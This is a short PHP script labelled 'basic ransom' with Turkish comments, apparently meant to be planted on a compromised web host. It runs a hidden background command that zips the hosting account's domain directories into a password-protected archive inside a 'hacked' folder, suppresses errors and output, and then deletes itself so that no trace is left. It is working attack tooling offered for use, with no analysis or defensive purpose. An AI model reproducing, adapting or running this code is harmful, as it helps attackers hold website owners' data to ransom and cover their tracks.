<?php
/**
 * zipper.php - basic ransom 
 */

@ini_set('display_errors', 0);
@error_reporting(0);
set_time_limit(0);

$source_dir = 'domainlerinbulundugudizin'; // ornek : /home/u242017739/domains/
$output_dir = 'zipinbuluncagıdizin'; // ornek :/home/u242017739/hacked
$zip_name = 'zipinadı'; //ornek hacklendiniz.zip
$password = 'sifre'; // ornek : yarrak31
$final_path = $output_dir . '/' . $zip_name;
$self = __FILE__;

if (!is_dir($output_dir)) {
    @mkdir($output_dir, 0777, true);
}

// 2. Bash Komutunu İnşa Et
// -r: Klasörleri içindekilerle birlikte al (recursive)
// -P: Şifre koy
// nohup: Arka planda çalıştır
// dev/null: Logları ve çıktıları gizle
$cmd = "nohup zip -r -P $password $final_path $source_dir > /dev/null 2>&1 &";

// 3. İşlemi Tetikle
$descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    // Pipe'ları kapat
    foreach ($pipes as $p) fclose($p);
    proc_close($process);

    // 4. Kendini İmha Et (İz bırakma)
    @unlink($self);

    echo "### İŞLEM BAŞLATILDI ###\n";
    echo "1. Kaynak: $source_dir\n";
    echo "2. Hedef: $final_path\n";
    echo "3. Durum: Arka planda zipleme devam ediyor.\n";
    echo "4. Şifre: $password\n";
    echo "5. Script kendini imha etti.";
} else {
    echo "Hata: Paketleme motoru başlatılamadı.";
}
?>
